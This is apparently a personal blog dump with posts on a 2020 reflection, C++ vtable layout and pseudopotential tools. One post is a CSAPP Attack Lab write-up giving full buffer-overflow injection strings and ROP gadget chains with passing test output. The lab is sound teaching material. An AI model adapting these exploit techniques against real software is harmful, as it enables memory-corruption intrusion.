posts.title: Cubefile Notes
posts.text: Recently I merged my scripts to deal with cubefiles into one repository, and I put it on github for future usage. Here is the code.

posts.title: 再见2020
posts.text: 2019年圣诞节前，我去Cascade mountain滑了几天雪，高兴之余，却在谋划着来年的一到三月份可以偶尔周末去芝加哥临近的Wilmot滑雪，甚至是置办一套雪具，这样2020年冬天就可以更加随心所欲了。略带一丝期待，2020年就这样来了。 一月底，武汉封城了。听到这个消息我是很震惊的，我无法想象如何控制住一座拥有上千万人口的城市而不造成混乱。彼时，BBC，CNN充斥着对国内疫情的嘲讽，将疫情称为中国的切尔诺贝利。然而武汉极为迅速地控制住了疫情，效率之高让我比听说武汉封城还要震惊。 一二月份的时候，国内的疫情还距离我很远。于是我还有机会跑去Wilmot滑了一次雪，聚了几次餐。去学校也没有戴过口罩，甚至根本没想过要买口罩。虽然我一直认为美国在走下坡路，但我依然对美国现在的实力充满信心。我想着国内确诊人数不过八万多，以美国的人口和先进的医疗资源，最多也就确诊一两万吧。然而，美国现在的确诊人数已经逼近两千万了。 二月底，一年一度的APS年会取消了。准备了半个月的presentation报废了，但还是有些庆幸，因为这时美国的疫情终于在川大统领的加持下爆发了。 接下来，芝加哥开始所谓的“封城”。本来想着，大约会想国内一样封上一个月，问题也就解决了。万万没想到，自三月初开始，我就这样居家隔离到现在。过去的十个月中，我出门的次数屈指可数，这是我过往的二十多年中没有过的经历。长时间的居家，让人心情郁闷，科研进展也非常缓慢。还好，从11月底终于开始写第二篇文章了，希望明年能好起来吧。 这一年的居家，让我不禁思考自己未来的走向。现阶段，美国依然是领先的，如果在美国工作，自然会拥有比国内更高的收入，压力也许更小。可是，这一年所看到的美国乱象，让我发自内心地认为美国的制度是没有未来的，是注定会被淘汰的。他们把自私当成自由，把制度性的压迫合理化，把系统性的腐败合法化。 万历十五年的大明，看上去依然光鲜亮丽，依然万国来朝。在遥远的关外，那支会在将来了结自己的力量才初露锋芒。未来在太平洋的哪一边，似乎是毋庸置疑的。 当红太阳升起的时候，人们还需要灯塔吗？ 2020-12，于风城

posts.title: CSAPP attack lab
posts.text:
最近在看CSAPP以及相应的2015 Fall的lecture, 未来如果连接失效，可以去看CSAPP3e的章节3.10。 背景Attack lab是CSAPP课程的第三个实验，延续了第二个实验Bomb，继续在关注x86_64的汇编语言。不同之处在于，Bomb lab只需要能够读懂汇编代码即可，但Attack lab在理解汇编的基础上要有一定写汇编的能力。 栈溢出一些函数中会声明数组来接受用户的输入，这样的数组如果位于栈中，则用户可能通过恶意地输入大于数组大小的输入，从而修改栈中内容来进行代码注入(Code Injection)。以下图为例图中数组buf的大小为8个字节，如果用户输入大于8个字节，则栈溢出。如果用户输入大于24个字节，则echo函数返回时，%rsp+24里面的内容已经被修改。特殊地，如果此时%rsp+24中已经被修改为某段代码的地址，则程序会开始执行用户所希望的其它代码。 栈溢出的保护事实上，上面的这种代码注入方式在现代的程序中其实已经难以适用了，因为下面的栈溢出的保护方法已经被编译器广泛地使用了。常见的栈保护方法有 Stack Randomization (栈地址的随机化) 代码注入时，经常会需要知道栈中的某些地址。因此，编译器会让栈的起始地址随机化，这样两次运行会有不同的地址，提高了代码注入的难度。 Limiting Executable Code Region （限制可运行代码的区域） 通常，正常编译的程序的指令位于指令区(.text region)。因此，编译器可以考虑禁止栈上的内容可执行。 Stack Corruption Detection (检测) 现代的编译器会buffer之上，放置一个canary（金丝雀） value。函数返回时，会检测canary value是否被修改。一旦发现修改，则直接停止执行。如下图所示。 当然，本次实验中这些保护机制被部分或全部关闭，否则我们很难进行攻击。 Attack lab这个实验分为两个部分 Code Injection Attack: 这部分中，三个保护机制都被关闭，我们可以直接溢出buffer修改栈上的内容，从而注入我们的代码 Return-Oriented Attack: 这部分中栈的地址有随机性，因此我们不能直接使用某些关键的地址。其次，栈中内容不能被执行，因此我们无法直接注入我们的恶意代码。具体如何做，见下文。 代码注入我们的目标文件是可执行文件ctarget。这个文件中存在如下的函数 123456void test(){ int val; val = getbuf(); printf("No exploit. Getbuf returned 0x%x
", val);} 其中getbuf的定义如下，(buffer size 0x28是用objdump反汇编看到的)。 123456unsigned getbuf(){ char buf[BUFFER_SIZE]; // 0x28 = 40 Gets(buf); return 1;} 可知，getbuf读入40个字节的内容。这个作业的目标是通过故意溢出buf修改栈中内容，从而在getbuf返回时执行我们希望的代码，而不是返回到test中继续执行。 代码注入: Phase 1可执行文件ctarget中定义了一个函数touch1。在这一阶段中，我们希望在getbuf返回时，转去执行touch1。 在命令行中执行， 1objdump --disassemble=touch1 ctarget 可以得到 123400000000004017c0 <touch1>: 4017c0: 48 83 ec 08 sub $0x8,%rsp ... ... 因此touch1的起始地址是0x4017c0。类似的，我们可以得到getbuf的汇编， 123456700000000004017a8 <getbuf>: 4017a8: 48 83 ec 28 sub $0x28,%rsp 4017ac: 48 89 e7 mov %rsp,%rdi 4017af: e8 8c 02 00 00 callq 401a40 <Gets> 4017b4: b8 01 00 00 00 mov $0x1,%eax 4017b9: 48 83 c4 28 add $0x28,%rsp 4017bd: c3 retq 从汇编代码中可以看出，getbuf首先将寄存器栈顶寄存器%rsp下移40个字节作为缓冲区接受用户输入，然后返回。为了使得touch1在getbuf返回后获取程序控制权，我们需要输入48个字节。其中前四十个不重要，后面8个字节应该是touch1的起始地址。这样getbuf返回时，%rsp向上跳40个字节，新的%rsp中存储的恰好为touch1的地址，因此开始执行touch1。 这题的答案为（注意大小端） 1234500 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 /* first 40 bytes are not important*/c0 17 40 /* initial address of touch1 */ 测试 123456789101112./hex2raw < ctarget.phase1.txt | ./ctarget -qCookie: 0x59b997faType string:Touch1!: You called touch1()Valid solution for level 1 with target ctargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 需要指出的是，我们的答案使用16进制表示，我们要使用作业中提供的hex2raw将其转换为字符串作为ctarget的输入。我们还需要使用ctarget的-q选项，这样ctarget不会试图将我们的答案提交到作业批改服务器。毕竟对于自学者来说，这个服务器并不存在。 代码注入：Phase 2与Phase 1类似，我们希望在getbuf返回时调用另一个函数touch2。与touch1不同的是，touch2需要传递一个参数。这意味着我们需要在调用touch2之前，将参数的值传递给%rdi寄存器。作业中要求将cookie.txt中的值作为参数，即0x59b997fa. 首先得到touch2的地址， 123456 objdump --disassemble=touch2 ctarget00000000004017ec <touch2>: 4017ec: 48 83 ec 08 sub $0x8,%rsp ... ... 即0x4017ec. 在调用touch2之前，我们需要运行movq $0x59b997fa, %rdi。但是直接把这条命令的字节码放到栈中是无法运行的，因为它的字节码会被当做是一个地址。因此我们可以考虑将这条命令的字节码放入内存，但是在$rsp中放入这段字节码的起始地址，这样才会跳到这条命令并执行。 在执行完上面这条指令后，我们需要执行touch2。这里的做法，是将touch2的起始地址压栈，返回。返回之后会弹出touch2的地址，并开始执行。 答案： 1234567848 c7 c7 fa 97 b9 59 /* mov $0x59b997fa,%rdi */68 ec 17 40 00 /* pushq $0x4017ec */c3 /* retq */00 00 00 00 00 00 0000 00 00 00 00 00 0000 00 00 00 00 00 0000 00 00 00 00 0078 dc 61 55 测试： 12345678910111213./hex2raw < ctarget.phase2.txt | ./ctarget -qCookie: 0x59b997faType string:Touch2!: You called touch2(0x59b997fa)Valid solution for level 2 with target ctargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 代码注入：Phase 3与上一阶段类似，这里要求调用函数touch3。但与上面不同的是，我们需要将cookie按照字节码传入形成一个char数组，并且将这个char数组的头指针传递给touch3作为参数。 123456789101112131415void touch3(char *sval){ vlevel = 3; /* Part of validation protocol */ if (hexmatch(cookie, sval)) { printf("Touch3!: You called touch3("%s")
", sval); validate(3); } else { printf("Misfire: You called touch3("%s")
", sval); fail(3); } exit(0);} 值得注意的是，touch3会调用一个名为hexmatch的函数，这个函数会在栈上创建缓冲区。这意味着我们上面的做法不再可行，因为hexmatch可能会覆盖掉我们的数据。 12345678/* Compare string to hex represention of unsigned value */int hexmatch(unsigned val, char *sval){ char cbuf[110]; // 压栈 /* Make position of check string unpredictable */ char *s = cbuf + random() % 100; sprintf(s, "%.8x", val); return strncmp(sval, s, 9) == 0;} 当然，解决方案也很简单，只要把我们phase 2中的数据位置移动到%rsp+0x28之上就可以了。 答案： 12345678948 c7 c7 a8 dc 61 55 /* mov $0x5561dcb0,%rdi */68 fa 18 40 00 /* pushq $0x4018fa */c3 /* retq */00 00 00 00 00 00 0000 00 00 00 00 00 0000 00 00 00 00 00 0000 00 00 00 00 0078 dc 61 55 00 00 00 0035 39 62 39 39 37 66 61 00 测试： 1234567891011121314./hex2raw < ctarget.phase3.txt | ./ctarget -qCookie: 0x59b997faType string:Touch3!: You called touch3("59b997fa")Valid solution for level 3 with target ctargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00 返回导向编程 Return oriented programming上面的代码注入有两个前提条件，第一，栈的地址不能是随机的；第二，栈上的代码可以执行。那么，如果这两个条件不能满足呢？Return oriented programming的思路是，既然我插进去的代码无法运行，那么只好重复利用程序字节码中本来就位于.test区的代码。 返回导向的意思是我们只打算重复利用函数返回之前的代码，这样把一系列执行之后就立即返回的代码排列在栈里，就可能达到我们想要的效果。这里需要指出的是，由于我们只是从程序本来的字节码中摘抄，所以执行的效果可能与他们所处函数中的作用完全不相干。举例来说，如果有一个函数的结尾汇编是如下的形式， 1230000000000400f15 <setval_210>: 400f15: c7 07 d4 48 89 c7 movl $0xc78948d4,(%rdi) 400f1b: c3 retq 如果我们把地址0x400f18放入栈中，那么实际执行的是将%rax的内容复制到%rdi中。 12400f18: 48 89 c7 movl %rax, %rdi400f1b: c3 retq 可见，摘抄出来执行的效果和原来的效果可以很不相同。 返回导向编程：重做Phase 2由于我们现在无法注入代码，所以我们希望把cookie先放到%rax中，再移动到%rdi中， 知道了要做什么，我需要将汇编代码编译成字节码，然后再到作业中提供的farm.c中寻找可以用的gadget。 123456popq %raxnopretqmovq %rax, %rdinopretq 编译后得到 12345678objdump -d rtarget.phase2.o0000000000000000 <.text>: 0: 58 pop %rax 1: 90 nop 2: c3 retq 3: 48 89 c7 mov %rax,%rdi 6: 90 nop 7: c3 retq 接下来就是在rtarget中查找我们需要的代码，例如58 90 c3可以在下面这个函数中找到 12300000000004019a7 <addval_219>: 4019a7: 8d 87 51 73 58 90 lea -0x6fa78caf(%rdi),%eax 4019ad: c3 retq 因此我们只需要把地址0x4019b1放入栈中即可。可以看到，摘抄出来执行的代码和原来函数中的语义可以完全不相关。 这里还有两个小问题，1. 为什么不直接将cookie放到%rdi中？因为我没有在作业提供的函数中farm.c找到需要的字节码。2. 为什么要放置一个nop？同样是因为没有在farm.c中找到相应的字节码，而nop不会对我们的结果产生影响。 答案: 1234567800 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00cc 19 40 00 00 00 00 00 /* 这个地址对应的字节码是 popq %rax */fa 97 b9 59 00 00 00 00 /* cookie */c5 19 40 00 00 00 00 00 /* 这个地址对应的字节码是 movq %rax, %rdi */ec 17 40 00 00 00 00 00 /* touch2 address */ 测试： 123456789101112131415./hex2raw < rtarget.phase2.txt | ./rtarget -qCookie: 0x59b997faType string:Touch2!: You called touch2(0x59b997fa)Valid solution for level 2 with target rtargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 返回导向编程：重做Phase 3这个问题与上一问很类似，但有一个难点，即cookie放入栈中之后的地址是不清楚的。因此我们的做法如下，先罗列出我们需要做的操作，然后放入数据，这样我们的数据相对于%rsp+0x24的偏移量就是确定的了。最后把这个偏移量的对应数据补到字节码里面。 首先我们罗列我们需要做的操作 1234567891011121314151617181920212223242526272829303132333435363738394041// 注意，getbuf返回之后%rsp已经向上加了0x28// 先用%rdi暂时保存%rsp的地址，因为随着调用，%rsp的值会变movq %rsp, %raxretqmovq %rax, %rdinopretq// 用%rax保存cookie的存储位置关于%rsp的偏移量，// 但是这个偏移量我们现在还不知道 popq %raxnopretq// 这里需要8个字节存储偏移量// 经过一些列mov操作，目的是将偏移量转移到%rsi中movl %eax, %edxnopretqmovl %edx, %ecxorb %bl, %blretqmovl %ecx, %esinopnopretq// 利用%rdi中存储的%rsp和%rsi中存储的偏移量// 计算cookie数据的实际存储位置leaq (%rdi,%rsi,1),%raxretq// 讲cookie的存储位置放入%rdimovq %rax, %rdinopretq// touch3 函数的地址// cookie数据的头地址 进过这样一番罗列，我们就可以知道最后的cookie头地址举例一开始的%rsp之间的偏移量了。需要注意的是当movq %rsp, %rax执行的时候，%rsp已经指向了movq %rax, %rdi那一行，计算偏移量的时候应该注意这一点。 上面的代码中，经过了一些列各种mov的骚操作，原因也很简单，这只是我找到的能走得通的一条路径。毕竟我们只能在限定好的范围内寻找可以利用的字节码段。 答案： 12345678910111213141500 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 /* initial 40 bytes are left empty */06 1a 40 00 00 00 00 00 /* movq %rsp, %rax */c5 19 40 00 00 00 00 00 /* movq %rax, %rdi */ab 19 40 00 00 00 00 00 /* pop %rax */48 00 00 00 00 00 00 00 /* number of offsets, 72 = 0x48 */dd 19 40 00 00 00 00 00 /* movl %eax, %edx */69 1a 40 00 00 00 00 00 /* movl %edx, %ecx */13 1a 40 00 00 00 00 00 /* movl %ecx, %esi */d6 19 40 00 00 00 00 00 /* leaq (%rdi,%rsi,1), %rax */c5 19 40 00 00 00 00 00 /* movq %rax, %rdi */fa 18 40 00 00 00 00 00 /* address of touch3 */35 39 62 39 39 37 66 61 00 /* ascii for cookie */ 测试： 123456789101112131415161718./hex2raw < rtarget.phase3.txt | ./rtarget -qCookie: 0x59b997faType string:Touch3!: You called touch3("59b997fa")Valid solution for level 3 with target rtargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 69 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00 总结个人感觉，这个实验难度比较大，我是参考了网上的一些思路才搞明白要怎么做。即使如此，还是要花很长时间才能通过测试。搁在CMU，这算cheat了。通过这样一个作业，对于汇编更加熟悉了，对于function call的理解也更加深刻。

posts.title: C++对象模型(上)
posts.text: 本文总结了C++中的虚函数机制。 C++中的虚函数机制是实现多态的基础，因此有必要理解虚函数的具体实现。接下来我们逐层深入，讨论不同情形下的虚函数。在讨论过程中我们需要用到头文件cstddef中定义的宏offsefof(Type,Member)来获取某个成员的偏移量。 没有虚函数的类下面这段代码中定义了一个不包含虚函数的类。这个类中包含了一个non-virtual函数func1，一个静态non-virtual函数func2和一个静态成员变量i，并且他们的定义均在成员变量j之前。但我们变量j的偏移量仍然为0，并且sizeof(Foo)的结果为4个字节。这是因为上面定义的几种函数和变量均放在对象之外，例如静态成员变量放在静态区，所以他们并不会影响类中成员变量的存储。可见，在没有虚函数的情况下，与C中的结构体struct相比，C++中并不会因为在类中封装了函数而产生额外的负担。 12345678910111213141516171819#include <iostream>#include <cstddef>using namespace std;class Foo{ public: void func1() {}; static void func2() {}; static int i; int j;};int Foo::i = 0;int main(){ cout << offsetof(Foo,j) << endl; //输出0 cout << sizeof(Foo) << endl; // 输出4} 在接下来的讨论中，我不在考虑上面提到的几种函数和静态变量，因为他们不对C++对象的大小和成员的偏移量产生影响。 只有一个虚函数的类下面的类Foo中包含两个整数和一个虚函数，我们查看了类的大小和两个数据的偏移量。 12345678910111213141516#include <iostream>#include <cstddef>using namespace std;class Foo{ public: int i; int j; virtual void func() {};};int main(){ cout << sizeof(Foo) << endl; // 输出 16 cout << offsetof(Foo,i) << endl; // 输出 8 cout << offsetof(Foo,j) << endl; // 输出 12} 不同的机器上输出结果可能会不同。我的MBP按照64位编译，并且似乎已经不支持模拟32位编译，因此在我的机器上一个指针占用8个字节。在其它的机器上可以用下面的命令按照32位编译，这样一个指针占用4个字节。 1g++ -m32 xxx.cpp // 按32位编译 offsetof宏作用在包含虚函数的类上会有Warning，但不影响运行。 我们注意到，在拥有一个虚函数后，Foo的大小是16个字节，而两个int的大小应该是8个字节。尽管i是Foo中首先出现的变量，但i的偏移量不再是0，而变成了8。 为了能够处理虚函数机制，含有虚函数的对象会在内存的开头防止一个虚指针__vptr指向一个虚函数表vtbl。因此，上面我们得到的i的偏移量是8个字节，即虚指针的大小。 有若干虚函数的类下面的类中定义了两个虚函数，但并没有影响到类的大小和成员变量的偏移量。 1234567891011121314151617#include <iostream>#include <cstddef>using namespace std;class Foo{ public: int i; int j; virtual void func1() {}; virtual void func2() {};};int main(){ cout << sizeof(Foo) << endl; // 16 cout << offsetof(Foo,i) << endl; // 8 cout << offsetof(Foo,j) << endl; // 12} 类中的虚函数都会放到虚函数表中，而不会再对象中增加新的指针。 同一个类的不同对象对于含有虚函数的类，它的每一个对象都会拥有一个虚指针__vptr，并且这些虚指针指向同一个虚函数表虚函数表在编译器生成，只保存一份。每当新的对象被创建，编译器都会讲其中的虚指针指向这个虚函数表。 不含虚函数的类继承含有虚函数的类这里“不含”虚函数是指，既没有重写基类中的虚函数，也没有定义新的虚函数。 1234567891011121314151617181920#include <iostream>#include <cstddef>using namespace std;class Base{ public: int i; virtual void func() {}};class Deriv: public Base{ public: int j;};int main(){ cout << sizeof(Deriv) << endl; // 16 cout << offsetof(Deriv,i) << endl; // 8 cout << offsetof(Deriv,j) << endl; // 12} Deriv的对象首先存储虚指针，其次是Base类中的数据i，最后是Deriv中的数据j.下图中的不同颜色，表示来自不同的类。 重写了基类虚函数的继承12345678910111213141516171819202122#include <iostream>#include <cstddef>using namespace std;class Base{ public: int i; virtual void func1() {} virtual void func2() {}};class Deriv: public Base{ public: int j; void func1() override {} // 重写};int main(){ cout << sizeof(Deriv) << endl; // 16 cout << offsetof(Deriv,i) << endl; // 8 cout << offsetof(Deriv,j) << endl; // 12} 在此种情形下，派生类的大小与前面一种情况相同。唯一的区别是，虚函数表中的函数指针被派生类重写的函数替代。 定义了新的虚函数的派生类如果派生类新增了基类没有的虚函数，则新增的虚函数会被放到基类虚函数表的最后，而不会产生一个新的虚指针和新的虚函数表。 基类不含虚函数且派生类定义了虚函数下面这个例子中基类只包含一个整数，因此大小为4个字节，且整数的偏移量为0。派生类中定义了一个整数和一个虚函数，此时派生类的大小变为16个字节，多出的8个字节来自于虚指针。值得注意的是，此时i的偏移量变成了8，也就是在虚指针之后。可见，虽然i的声明出现在虚函数之前，但最终虚指针却会被放在所有数据之前。 12345678910111213141516171819202122#include <iostream>#include <cstddef>using namespace std;class Base{ public: int i;};class Deriv: public Base{ public: int j; virtual void func() {}};int main(){ cout << sizeof(Base) << endl; // 4 cout << offsetof(Base,i) << endl; // 0 cout << sizeof(Deriv) << endl; // 16 cout << offsetof(Deriv,i) << endl; // 8 cout << offsetof(Deriv,j) << endl; // 12} 这种情况还可以推广到多继承的情形。如果一个派生类继承了多个基类，且每个基类都没有虚函数，在派生类中首先是虚指针，然后按照基类的继承顺序排列数据，最后是派生类中的数据。 12345class Deriv: public Base1, public Base2{ // Base1, Base2, ... do not have virtual functions // virtual func;}; 同时继承包含虚函数和不含虚函数的基类下面的例子中定义了两个基类Base1和Base2，他们各自含有两个整数（为了防止内存对其影响我们的讨论），其中Base1不含虚函数，Base2含有一个虚函数。派生类Deriv先后继承了Base1和Base2。 12345678910111213141516171819202122232425262728293031323334353637383940#include <iostream>#include <cstddef>using namespace std;class Base1{ public: int i1; int i2;};class Base2{ public: int j1; int j2; virtual void func() {}};class Deriv: public Base1, public Base2{ public: int k1; int k2;};int main(){ cout << sizeof(Base1) << endl; // 8 cout << offsetof(Base1,i1) << endl; // 0 cout << offsetof(Base1,i2) << endl; // 4 cout << sizeof(Base2) << endl; // 16 cout << offsetof(Base2,j1) << endl; // 8 cout << offsetof(Base2,j2) << endl; // 12 cout << sizeof(Deriv) << endl; // 32 cout << offsetof(Deriv,i1) << endl; // 16 cout << offsetof(Deriv,i2) << endl; // 20 cout << offsetof(Deriv,j1) << endl; // 8 cout << offsetof(Deriv,j2) << endl; // 12 cout << offsetof(Deriv,k1) << endl; // 24 cout << offsetof(Deriv,k2) << endl; // 28} 输出结果显示，Base1的大小为8，Base2的大小为16，Deriv的大小为32，这一点通过上面的讨论已经比较容易理解了。有意思的是他们数据的偏移量，可以看到，虽然在Deriv的声明中Base1被放在了Base2之前，但是内存中确实Base2的数据在Base1的数据之前。这是因为Base1不含虚函数，因此编译器会找到一个含有虚函数的类放在前面，这样虚指针会出现在Deriv类的最前面。 在上面这种情况下，如果派生类中重写了虚函数或者定义了新的虚函数，那么这些虚函数同样会被放到虚函数表中，没有特别的变化。例如下面图中，Deriv类重写了Base2::func()，同时又增加了一个虚函数Deriv::func2() 继承多个包含虚函数的类下面的派生类Deriv继承了两个含有虚函数的基类Base1和Base2，且三个类都各自声明了两个整数，即Deriv类中一共包含6个整数，占据24个字节。 123456789101112131415161718192021222324252627282930313233#include <iostream>#include <cstddef>using namespace std;class Base1{ public: int i1; int i2; virtual void func1() {}};class Base2{ public: int j1; int j2; virtual void func2() {}};class Deriv: public Base1, public Base2{ public: int k1; int k2;};int main(){ cout << sizeof(Deriv) << endl; // 40 cout << offsetof(Deriv,i1) << endl; // 8 cout << offsetof(Deriv,i2) << endl; // 12 cout << offsetof(Deriv,j1) << endl; // 24 cout << offsetof(Deriv,j2) << endl; // 28 cout << offsetof(Deriv,k1) << endl; // 32 cout << offsetof(Deriv,k2) << endl; // 36} 从运行结果来看，Deriv类的大小为40个字节，而不是24+8=32个字节。原因在于两个基类都包含虚函数，所以Deriv类中含有两个虚指针。那么这两个基类在内存中的排布是怎样的呢？从偏移量来看，这次两个基类的顺序是与Deriv继承的顺序是一致的，这是因为Base1中已经包含虚指针，因此无需交换位置。在Base1之后，排布的是Base2的虚函数和数据，最后是Deriv的数据。 如果再上述情况下，Deriv类重写了或者新增加了虚函数，那么这个虚函数该如何安排呢？如果重写了某个虚函数，那么就在相应的基类的虚函数表中修改，如果定义了新的虚函数，则放在第一个虚函数表中。例如，在上图中若派生类重写了Base2::func2()并新增了一个虚函数Deriv::func3()，则上图变为，如果，多个基类中含有重名的虚函数，并且在派生类中被重写，则所有积累中的方法都被派生类中重写的方法覆盖。 还需要指出的是，如果派生类继承了若干个基类，并且它们有的含有虚函数有的不含虚函数，最终派生类中会把含有虚函数的基类排列到不含虚函数的类之前。 小结上面的讨论中没有考虑虚继承、菱形继承等稍复杂一些的情况。讨论这些情况，需要对虚函数表多做一些描述。留待后续补充。

posts.title: Using FHI98PP program to generate pseudopotentials
posts.text: Here I write the workflow to generate pseudopotentials with FHI98PP program for personal reference. Installation Download the code and decompress 12wget https://th.fhi-berlin.mpg.de/th/fhi98md/download/fhi98PP.tar.gztar zxvf fhi98PP.tar.gz Change to the root directory of fhi98pp 1cd fhi98PP In lib/make. and src/Makefile change the variable FC to the fortran compiler that you have, for me, the intel fortran compiler ifort is used 1FC = ifort Then compile by typing 12cd srcmake In fhi98pp/work, we can see the executable psgen that will be used to generate pseudopotentials.Before running the code, don’t forget to set up environmental variable, 1export FHIPP_PATH=/path/to/fhi98PP Unfortunately, I see wiered runtime error on midway even though I can successfully compile the code. So, I can only run this code on my Mac. Generate psedopotentialsFHI98PP has its own defined input format and will be explained later.The good news is ABINIT website provides the input files for most elemets and you can find them here: LDA functional andGGA functional.Notes: In addition to fhi98pp input files, the two websites also provide generated psuedopotentials in fhi/pspnc formats. These fhi/pspnc files are NOT necessarily generated by the fhi98pp inputs. When you generate pseudopotentials from the fhi98pp inputs, probably you want to modify the inputs to meet your requirement. Format of fhi98pp inputsThis is a sample input (06-C.GGA.ini) for fhi98pp to generate Troullier-Martins type pseudopotential for carbon. 123456786.00 1 2 6 0.00 : z nc nv iexc rnlc 1 0 2.00 : n l f 2 0 2.00 2 1 2.002 "t" : lmax s_pp_def0 0.0 0 "t" : lt rct et s_pp_type1 0.0 0 "t"2 0.0 0 "t" Here are the line-by-line explanation. The first line contains 5 variables. variable description z nuclear charge nc number of core orbitals nv number of valence orbitals iexc index of exchange-correlation functional rnlc using linearized/nonlinearized exchange-correlation Note: rnlc = 0 means linearized core-valence exchange-correlation is used.Note: iexc must be chosen from the following, ixc Functional 1 LDA Wigner 2 LDA Hedin/Lundquist 3 LDA Perdew/Zunger 4 GGA Perdew/Wang 5 GGA Becke, Perdew 6 GGA PBE 7 8 LDA Perdew/Wang 9 GGA BLYP 10 GGA Perdew/Wang, Lee/Yang/Paar Note: the index of xc in fhi98pp is different from that in ABINIT.When we try to use the pseudopotentials generated by fhi98pp in ABINIT,we have to look up the index of xc in the manual of ABINIT. Line 2 to 4 in this sample input represent the electronic structure of diamond. variabl description n principle quantum number l angular momentum quantum number f occupation number So, in this example the electronic structure of diamond is $1s^22s^22p^2$. Next line has two parts, the max angular quantum number to be considered (lmax) and the type of pseudopotential to generate ( s_pp_def ).In this case, the largest quantum number to be considered is 2 ( d-type orbital ) and the type is “t” ( Troullier-Martins type ). Next several lines are optional. variable description lt For lt-th pseudopotential compotent: use alternate cutoff radius and/or reference energy and/or scheme from present line rct cutoff radius, = 0 ( using default ) or > 0 ( user-defined cutoff radius ) et reference energy, = 0 ( using default ) or $\neq 0$ ( user-defines reference energy ) s_pp_type type of the orbitals of this angular momentum Run the program and generate pseudopotentialTo generate the pseduopotential, run the executable psgen under fhi98pp_root/work 1psgen -o C.pbe-mt 06-C.GGA.ini The executable produces a pseudopotential named C.pbe-mt.cpi. Converting pseudopotentialsAfter previous steps, we have a pseudopotential in cpi format. However, this file cannot bedirectly used in ABINIT or Quantum Espresso. So, we have to convert the format to ABINIT’s fhi format and then Quantum Espresso’s upf format. ABINIT format (fhi)This step is trivial, we just need to add 7 lines to the beginning of the cpi file. Line 1, not important, sumply notes about the pseudopotential. e.g.Diamond, fhi98pp: Troullie-Martins type, GGA PBE Line 2 contains three varaibles variable description zatom the atomic number, i.e. the index of the element in periodic table zion the ionic charge, i.e. the number of valence electrons pspdat the date of pseudopotential generation Line 3 contains variable description pspcod format of the pseudopotential, must be 6, because the format will be fhi pspxc index of exchange-correlation functional. Note: the index in abinit is different from fhi98pp. Checkout ixc lmax the maximal angular momentum described in the pseudopotential, the same as in fhi98pp input lloc the angular momentum of the potential to be used as local pseudopotential mmax the number of radial mesh points, first number on the 12th line in original cpi file r2well always set to zero Line 4 contains variable description rchrg radius at which the core charge vanish, 0.0 if not specified otherwise in fhi98pp input fchrg amplitude of core charge, 0.0 if not core-corretion performed qchrg integrated model core charge, 0.0, will not be used by ABINIT Line 5-7 are meaningless, simply copy the following 1235--- These two lines are available for giving more information, later67-Here follows the cpi file from the fhi98pp code- Copy everything from the cpi file and append to the end of fhi file. NO EMPTY LINE!!! Quantum Espresso format (upf)After converting the pseudopotential to fhi format, we can convert the fhi file to Quantum Espresso’s upf format by using the executable under QE_ROOT/upftools/fhi2upf.x.Simply run it in command line and it will ask for the information it needs. 1QE_ROOT/upftools/fhi2upf.x

posts.title: Pseudopotentials and their derivatives in Quantum Espresso
posts.text: In this article, I’m going to summarize technical details about pseudopotentials as in Quantum Espresso ( QE ), especially the derivatives of pseudopotentials because they are important components involved in phonon calculation. Equations are valid in all version; while the codes might not be valid for all version of QE. In this article, the codes are written especially for QE v6.1. General idea of pseudopotentialsPseudopotentials (PP), also known as effective potentials in quantum chemistry community, are the functions the describe the potentials of core electrons in quantum physics community. People prefer to use pseudopotentials for two reasons. 1) Core electrons usually do not contribute to chemical processes like forming chemical bonds; 2) Due to the singularity of Coulomb interaction at nucleus, it is not easy to use numerical approximate basis to describe the singularity. Quantum chemistry communities use several gaussian functions at core to approximate this function, while in quantum physics community, where plane wave basis is popular, it is very difficult to deal with problem without pseudopotentials. For more detailed descriptions of pseudopotentials, check out the wiki page Pseudopotential. Categories of pseudopotentialsAlthough other kinds of pseudopotentials do exist, the following three flavors are most widely accepted, norm conserving, ultrasoft and projector augmented wave(PAW). Ultrasoft and PAW usually require lower plane wave cutoff compared to norm-conserving case, but they require more effort in terms of implementation. This article focuses on norm-conserving pseudopotentials. Norm-conserving pseudopotentialsThe general format of a pseudopotential reads where the two right-hand-side 